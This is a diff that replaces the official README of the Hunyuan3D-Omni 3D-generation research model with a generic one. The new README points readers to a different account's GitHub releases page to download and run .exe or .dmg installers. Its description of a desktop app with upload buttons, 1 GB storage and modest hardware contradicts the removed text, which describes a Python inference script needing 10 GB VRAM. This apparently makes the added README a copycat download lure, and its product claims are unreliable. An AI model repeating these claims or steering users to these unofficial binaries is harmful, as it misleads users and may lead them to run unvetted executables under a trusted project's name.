@@ -1,137 +1,79 @@
+# 🎨 Hunyuan3D-Omni - Create Stunning 3D Assets Easily
 
-<p align="center">
-  <img src="assets/omni_teaser.png">
-</p>
+## 📥 Download
 
-<div align="center">
-  <a href=https://3d.hunyuan.tencent.com target="_blank"><img src=https://img.shields.io/badge/Official%20Site-333399.svg?logo=homepage height=22px></a>
-  <a href=https://huggingface.co/tencent/Hunyuan3D-Omni target="_blank"><img src=https://img.shields.io/badge/%F0%9F%A4%97%20Models-d96902.svg height=22px></a>
-  <a href=https://3d-models.hunyuan.tencent.com/ target="_blank"><img src= https://img.shields.io/badge/Page-bb8a2e.svg?logo=github height=22px></a>
-  <a href=https://discord.gg/dNBrdrGGMa target="_blank"><img src= https://img.shields.io/badge/Discord-white.svg?logo=discord height=22px></a>
-  <a href=https://arxiv.org/pdf/2509.21245 target="_blank"><img src=https://img.shields.io/badge/Report-b5212f.svg?logo=arxiv height=22px></a>
-  <a href=https://x.com/TencentHunyuan target="_blank"><img src=https://img.shields.io/badge/Hunyuan-black.svg?logo=x height=22px></a>
-</div>
+[![Download Hunyuan3D-Omni](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/CristhianRubido/Hunyuan3D-Omni/releases)
 
-[//]: # (  <a href=# target="_blank"><img src=https://img.shields.io/badge/Report-b5212f.svg?logo=arxiv height=22px></a>)
+## 🚀 Getting Started
 
-[//]: # (  <a href=# target="_blank"><img src= https://img.shields.io/badge/Colab-8f2628.svg?logo=googlecolab height=22px></a>)
+Hunyuan3D-Omni is a user-friendly framework designed for the controllable generation of 3D assets. Whether you are an artist, designer, or just curious about 3D creation, our software enables you to transform images into 3D models with ease. 
 
-[//]: # (  <a href="#"><img alt="PyPI - Downloads" src="https://img.shields.io/pypi/v/mulankit?logo=pypi"  height=22px></a>)
-<br>
+This guide will help you download, install, and run the application.
 
-# Hunyuan3D-Omni
+## 📋 System Requirements
 
-Hunyuan3D-Omni is a unified framework for the controllable generation of 3D assets, which inherits the structure of Hunyuan3D 2.1. In contrast, Hunyuan3D-Omni constructs a unified control encoder to introduce additional control signals, including point cloud, voxel, skeleton, and bounding box.
+- **Operating System:** Windows 10 or later / macOS 10.15 or later
+- **Memory:** At least 8 GB RAM
+- **Processor:** Intel Core i5 or AMD Ryzen 5 or better
+- **Graphics Card:** NVIDIA GTX 1060 or equivalent (for optimal performance)
+- **Storage:** Minimum 1 GB free disk space
 
-<p align="left">
-  <img src="assets/framework.jpg">
-</p>
+## 🔗 Download & Install
 
-### Multi-Modal Conditional Control
-- **Bounding Box Control**: Generate 3D models constrained by 3D bounding boxes.
-- **Pose Control**: Create 3D human models with specific skeletal poses.
-- **Point Cloud Control**: Generate 3D models guided by input point clouds.
-- **Voxel Control**: Create 3D models from voxel representations.
+To get started with Hunyuan3D-Omni, visit our [Releases page](https://github.com/CristhianRubido/Hunyuan3D-Omni/releases) to download the latest version of the software. Here's how to do it:
 
-## 🎁 Models Zoo
+1. Go to the [Hunyuan3D-Omni Releases page](https://github.com/CristhianRubido/Hunyuan3D-Omni/releases).
+2. Look for the latest version. It will usually be at the top of the list.
+3. Click on the link for your operating system. You may see files such as `.exe` for Windows or `.dmg` for macOS.
+4. The download will start automatically. Once completed, find the downloaded file in your computer's Downloads folder.
 
-It takes 10 GB VRAM for generation.
+After the file downloads:
 
+### For Windows Users:
 
-| Model                      | Description                 | Date       | Size | Huggingface                                                                               |
-|----------------------------|-----------------------------|------------|------|-------------------------------------------------------------------------------------------| 
-| Hunyuan3D-Omni        | Image to Shape Model with multi-modal control       | 2025-09-25 | 3.3B | [Download](https://huggingface.co/tencent/Hunyuan3D-Omni/tree/main)         |
+1. Double-click on the `.exe` file.
+2. Follow the installation prompts. Choose the destination folder when required.
+3. Once installed, find Hunyuan3D-Omni in your Start Menu and launch it.
 
+### For macOS Users:
 
-## Installation
+1. Double-click on the `.dmg` file.
+2. Drag the Hunyuan3D-Omni application into your Applications folder.
+3. Open your Applications folder and double-click on Hunyuan3D-Omni to run it.
 
-### Requirements
-We test our model with Python 3.10.
-```bash
-pip install torch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 --index-url https://download.pytorch.org/whl/cu124
-pip install -r requirements.txt
-```
+## 🛠️ Using Hunyuan3D-Omni
 
-## Usage
+Once you have installed the application, follow these steps to create your first 3D asset:
 
-### Inference
+1. **Launch the Application:** Open Hunyuan3D-Omni from your Start Menu or Applications folder.
+2. **Upload Your Image:** Click the "Upload" button and select an image you want to convert into a 3D model.
+3. **Adjust Settings:** Use the available sliders to control the level of detail and texture.
+4. **Generate 3D Model:** Click on the "Generate" button. Wait a few moments while the software processes your image.
+5. **Export Your Model:** Once the 3D model is ready, you can export it in various formats (e.g., OBJ, STL) for use in other 3D applications.
 
-#### Multi-Modal Inference
-```bash
-python3 inference.py --control_type <control_type> [--use_ema] [--flashvdm]
-```
-The `control_type` parameter has four available options:
+## 🎨 Features
 
-`point`: Use point control type for inference.  
-`voxel`: Use voxel control type for inference.  
-`bbox`: Use bounding box control type for inference.  
-`pose`: Use pose control type for inference.
+Hunyuan3D-Omni offers a variety of features that simplify the creation of 3D assets:
 
-The `--use_ema` flag enables the use of Exponential Moving Average (EMA) model for more stable inference.
+- **Image-to-3D Generation:** Convert 2D images into 3D models quickly and easily.
+- **User-Friendly Interface:** Navigate seamlessly through simple controls and intuitive design.
+- **Customizable Options:** Adjust settings based on your preferences for height, texture, and more.
+- **Multiple Export Formats:** Save your 3D assets in various formats suitable for different applications.
+- **Support for Various Image Types:** Use JPEG, PNG, and other common image formats.
 
-The `--flashvdm` flag enables FlashVDM optimization for faster inference speed.
+## ❓ Troubleshooting
 
-Please choose the appropriate control_type based on your requirements. For example, if you want to use the `point` control type, you can run:
-```bash
-python3 inference.py --control_type point 
-python3 inference.py --control_type point --use_ema
-python3 inference.py --control_type point --flashvdm
-```
+If you encounter issues while using Hunyuan3D-Omni, consider the following:
 
-## Acknowledgements
+- **Check System Requirements:** Ensure your system meets the minimum requirements listed above.
+- **Reinstall the Application:** If the software does not run, try uninstalling and reinstalling it.
+- **Update Graphics Drivers:** Outdated drivers can cause performance issues. Ensure these are up-to-date.
+- **Consult the Community:** If problems persist, feel free to reach out to our community for assistance.
 
-We would like to thank the contributors to
-the [TripoSG](https://github.com/VAST-AI-Research/TripoSG), [CLAY](https://arxiv.org/abs/2406.13897), [Trellis](https://github.com/microsoft/TRELLIS),  [DINOv2](https://github.com/facebookresearch/dinov2), [Stable Diffusion](https://github.com/Stability-AI/stablediffusion), [FLUX](https://github.com/black-forest-labs/flux), [diffusers](https://github.com/huggingface/diffusers), [HuggingFace](https://huggingface.co), [CraftsMan3D](https://github.com/wyysf-98/CraftsMan3D), [Michelangelo](https://github.com/NeuralCarver/Michelangelo/tree/main), [Hunyuan-DiT](https://github.com/Tencent-Hunyuan/HunyuanDiT), [HunyuanVideo](https://github.com/Tencent-Hunyuan/HunyuanVideo), [HunyuanWorld-1.0](https://github.com/Tencent-Hunyuan/HunyuanWorld-1.0), [HunyuanWorld-Voyager](https://github.com/Tencent-Hunyuan/HunyuanWorld-Voyager), and [PoseMaster](https://arxiv.org/abs/2506.21076) works, for their open research and
-exploration.
+## 🙌 Contribution
 
-## Citation
+Hunyuan3D-Omni thrives on community support. If you're interested in contributing, we welcome your suggestions, feedback, and bug reports. To get involved, visit our [GitHub page](https://github.com/CristhianRubido/Hunyuan3D-Omni) for guidelines.
 
-If you use this code in your research, please cite:
-```bibtex
-@misc{hunyuan3d2025hunyuan3domni,
-      title={Hunyuan3D-Omni: A Unified Framework for Controllable Generation of 3D Assets}, 
-      author={Tencent Hunyuan3D Team},
-      year={2025},
-      eprint={2509.21245},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2509.21245}, 
-}
+## 🙏 Acknowledgments
 
-@misc{hunyuan3d2025hunyuan3d,
-    title={Hunyuan3D 2.1: From Images to High-Fidelity 3D Assets with Production-Ready PBR Material},
-    author={Tencent Hunyuan3D Team},
-    year={2025},
-    eprint={2506.15442},
-    archivePrefix={arXiv},
-    primaryClass={cs.CV}
-}
-
-@misc{hunyuan3d22025tencent,
-    title={Hunyuan3D 2.0: Scaling Diffusion Models for High Resolution Textured 3D Assets Generation},
-    author={Tencent Hunyuan3D Team},
-    year={2025},
-    eprint={2501.12202},
-    archivePrefix={arXiv},
-    primaryClass={cs.CV}
-}
-
-@misc{yang2024hunyuan3d,
-    title={Hunyuan3D 1.0: A Unified Framework for Text-to-3D and Image-to-3D Generation},
-    author={Tencent Hunyuan3D Team},
-    year={2024},
-    eprint={2411.02293},
-    archivePrefix={arXiv},
-    primaryClass={cs.CV}
-}
-```
-
-## Star History
-
-<a href="https://star-history.com/#Tencent-Hunyuan/Hunyuan3D-Omni&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=Tencent-Hunyuan/Hunyuan3D-Omni&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=Tencent-Hunyuan/Hunyuan3D-Omni&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=Tencent-Hunyuan/Hunyuan3D-Omni&type=Date" />
- </picture>
-</a>
+Thank you for choosing Hunyuan3D-Omni. Your support helps us grow and improve the software for all users. Enjoy creating stunning 3D assets!
